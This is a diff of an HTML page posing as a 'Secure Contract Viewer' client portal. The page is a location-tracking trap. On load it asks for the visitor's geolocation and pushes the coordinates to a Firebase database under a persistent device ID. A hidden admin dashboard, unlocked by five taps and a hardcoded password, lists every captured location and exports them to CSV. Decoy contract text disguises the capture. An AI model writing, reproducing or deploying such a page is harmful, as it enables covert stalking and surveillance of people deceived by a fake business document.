@@ -1,62 +1,83 @@
-<!DOCTYPE html>
-<html>
+<!DOCTYPE html><html lang="en">
 <head>
-  <title>Global Partnership Solutions</title>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Secure Contract Viewer</title>
   <style>
-    body { margin: 0; font-family: Arial, sans-serif; background: #f2f2f2; }
-    header { background: #003366; color: #fff; padding: 20px; text-align: center; }
-    section { padding: 40px 20px; }
-    .contract-box { max-width: 800px; margin: auto; background: white; padding: 30px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
-    .contract-title { font-size: 28px; font-weight: bold; color: #333; margin-bottom: 20px; }
-    .contract-text { font-size: 16px; color: #555; line-height: 1.6; }
-    .admin-panel { display: none; max-width: 1000px; margin: 30px auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.2); }
-    .admin-title { font-size: 22px; font-weight: bold; margin-bottom: 10px; }
-    table { width: 100%; border-collapse: collapse; margin-top: 10px; }
-    th, td { padding: 10px; border: 1px solid #ccc; font-size: 14px; }
-    th { background: #003366; color: white; }
-    input[type="text"] { padding: 8px; width: 100%; margin-bottom: 10px; }
-    #exportBtn { padding: 8px 16px; background: #006600; color: white; border: none; cursor: pointer; }
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: #f4f4f4;
+      color: #333;
+    }
+    header, footer {
+      background: #2b2b2b;
+      color: white;
+      padding: 20px;
+      text-align: center;
+    }
+    .section {
+      padding: 20px;
+      border-bottom: 1px solid #ddd;
+    }
+    .admin-panel {
+      display: none;
+      background: white;
+      padding: 20px;
+    }
+    #logTable {
+      width: 100%;
+      border-collapse: collapse;
+    }
+    #logTable th, #logTable td {
+      border: 1px solid #ccc;
+      padding: 10px;
+    }
+    #logTable th {
+      background: #eee;
+    }
+    .hidden-input {
+      position: fixed;
+      bottom: 10px;
+      right: 10px;
+      background: #fff;
+      padding: 5px;
+      border: 1px solid #ccc;
+      display: none;
+    }
   </style>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
 </head>
 <body>
   <header>
-    <h1>Global Partnership Solutions</h1>
-  </header>
-
-  <section>
-    <div class="contract-box" id="viewerPage">
-      <div class="contract-title">Business Agreement</div>
-      <div class="contract-text">
-        This document outlines a formal agreement for project development under Global Partnership Solutions. Ensure you agree with the outlined terms and responsibilities. Your consent is required to continue with the contractual engagement.
-      </div>
-    </div>
-  </section>
-
-  <div class="admin-panel" id="adminPanel">
-    <div class="admin-title">📍 Real-time Tracker Dashboard</div>
-    <input type="text" id="searchBox" placeholder="Search by ID..." />
-    <button id="exportBtn">Export CSV</button>
-    <table id="locationTable">
-      <thead>
-        <tr>
-          <th>ID</th>
-          <th>Lat</th>
-          <th>Lng</th>
-          <th>Speed</th>
-          <th>Timestamp</th>
-          <th>Map Link</th>
-        </tr>
-      </thead>
-      <tbody></tbody>
-    </table>
+    <h1>Client Project Portal</h1>
+  </header>  <div class="section">
+    <h2>Client Requirements</h2>
+    <p>All specifications must be approved and timestamped.</p>
   </div>
-
-  <!-- Firebase -->
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
-  <script>
+  <div class="section">
+    <h2>Terms and Review</h2>
+    <p>Final review will be automatically saved and verified upon access.</p>
+  </div>
+  <div class="section">
+    <h2>Legal & Compliance</h2>
+    <p>Ensure full adherence to documentation agreements.</p>
+  </div>  <div id="adminPanel" class="admin-panel">
+    <h2>Admin Dashboard</h2>
+    <input type="text" id="search" placeholder="Filter search..." oninput="filterLogs()">
+    <button onclick="exportCSV()">Export CSV</button>
+    <table id="logTable">
+      <thead>
+        <tr><th>Device</th><th>Latitude</th><th>Longitude</th><th>Timestamp</th></tr>
+      </thead>
+      <tbody id="logBody"></tbody>
+    </table>
+  </div>  <div class="hidden-input" id="passwordInput">
+    <input type="password" id="adminPassword" placeholder="Enter password" onkeydown="checkPassword(event)">
+  </div>  <footer>
+    <p>This page is protected by a secure contract interface.</p>
+  </footer>  <script>
     const firebaseConfig = {
       apiKey: "AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw",
       authDomain: "gps-d0bab.firebaseapp.com",
@@ -69,73 +90,70 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    function updateTable(data) {
-      const table = document.querySelector("#locationTable tbody");
-      table.innerHTML = "";
-      Object.entries(data).forEach(([id, loc]) => {
-        const row = document.createElement("tr");
-        row.innerHTML = `
-          <td>${id}</td>
-          <td>${loc.lat}</td>
-          <td>${loc.lng}</td>
-          <td>${loc.speed || 'N/A'}</td>
-          <td>${new Date(loc.timestamp).toLocaleString()}</td>
-          <td><a href="https://www.google.com/maps?q=${loc.lat},${loc.lng}" target="_blank">View</a></td>
-        `;
-        table.appendChild(row);
+    const deviceID = localStorage.getItem("deviceID") || Math.random().toString(36).substring(2);
+    localStorage.setItem("deviceID", deviceID);
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(pos => {
+        const log = {
+          lat: pos.coords.latitude,
+          lng: pos.coords.longitude,
+          timestamp: new Date().toISOString()
+        };
+        db.ref("locations/" + deviceID).push(log);
       });
     }
 
-    function filterTable() {
-      const filter = document.getElementById("searchBox").value.toLowerCase();
-      const rows = document.querySelectorAll("#locationTable tbody tr");
-      rows.forEach(row => {
-        const text = row.textContent.toLowerCase();
-        row.style.display = text.includes(filter) ? "" : "none";
-      });
-    }
-
-    document.getElementById("searchBox").addEventListener("input", filterTable);
-
-    db.ref("locations").on("value", (snap) => {
-      if (snap.exists()) {
-        updateTable(snap.val());
-      }
-    });
-
-    document.getElementById("exportBtn").addEventListener("click", () => {
-      const rows = document.querySelectorAll("#locationTable tr");
-      let csv = "";
-      rows.forEach(row => {
-        const cols = row.querySelectorAll("td, th");
-        const rowText = [...cols].map(col => `"${col.innerText}"`).join(",");
-        csv += rowText + "\n";
-      });
-      const blob = new Blob([csv], {type: "text/csv"});
-      const link = document.createElement("a");
-      link.href = URL.createObjectURL(blob);
-      link.download = "locations.csv";
-      link.click();
-    });
-
-    // Admin unlock: 5x tap then scroll to bottom then enter password
     let tapCount = 0;
-    document.body.addEventListener("click", () => {
+    document.body.addEventListener('click', () => {
       tapCount++;
       if (tapCount >= 5) {
-        window.addEventListener("scroll", () => {
-          if ((window.innerHeight + window.scrollY) >= document.body.scrollHeight) {
-            const pass = prompt("Enter access password:");
-            if (pass === "ASCII") {
-              document.getElementById("adminPanel").style.display = "block";
-              document.getElementById("viewerPage").style.display = "none";
-            } else {
-              alert("Access denied");
-            }
-          }
-        }, { once: true });
+        document.getElementById('passwordInput').style.display = 'block';
       }
+      setTimeout(() => tapCount = 0, 2000);
     });
-  </script>
-</body>
-        </html>
+
+    function checkPassword(e) {
+      if (e.key === 'Enter' && e.target.value === 'ASCII') {
+        document.getElementById('adminPanel').style.display = 'block';
+        document.getElementById('passwordInput').style.display = 'none';
+        loadLogs();
+      }
+    }
+
+    function loadLogs() {
+      db.ref("locations").on("value", snap => {
+        const logs = snap.val();
+        const logBody = document.getElementById("logBody");
+        logBody.innerHTML = "";
+        for (let dev in logs) {
+          logs[dev] && Object.values(logs[dev]).forEach(log => {
+            const row = `<tr><td>${dev}</td><td>${log.lat}</td><td>${log.lng}</td><td>${log.timestamp}</td></tr>`;
+            logBody.innerHTML += row;
+          });
+        }
+      });
+    }
+
+    function filterLogs() {
+      const query = document.getElementById("search").value.toLowerCase();
+      const rows = document.querySelectorAll("#logTable tbody tr");
+      rows.forEach(row => {
+        row.style.display = row.innerText.toLowerCase().includes(query) ? '' : 'none';
+      });
+    }
+
+    function exportCSV() {
+      let csv = "Device,Latitude,Longitude,Timestamp\n";
+      document.querySelectorAll("#logTable tbody tr").forEach(row => {
+        csv += Array.from(row.children).map(cell => cell.innerText).join(",") + "\n";
+      });
+      const blob = new Blob([csv], { type: 'text/csv' });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = 'location_logs.csv';
+      a.click();
+    }
+  </script></body>
+              </html>
